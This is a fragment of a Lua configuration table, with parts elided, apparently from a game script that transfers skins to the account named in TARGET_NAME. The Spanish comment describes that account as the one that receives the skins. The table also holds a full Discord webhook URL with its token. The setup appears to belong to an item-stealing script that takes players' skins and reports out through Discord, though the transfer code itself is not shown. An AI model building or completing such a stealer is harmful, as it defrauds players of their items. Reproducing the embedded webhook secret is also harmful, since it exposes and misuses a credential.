local CONFIG = {
    ...
    TARGET_NAME   = "allanlp4", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1550000945121984512/SmHRnxTNbVaOP-abfNdt8DilDF-X0f-07MByHM4OENPEU7KONZEEA58UFKKPQkzTaemn", -- "https://discord.com/api/webhooks/" webhook de Discord
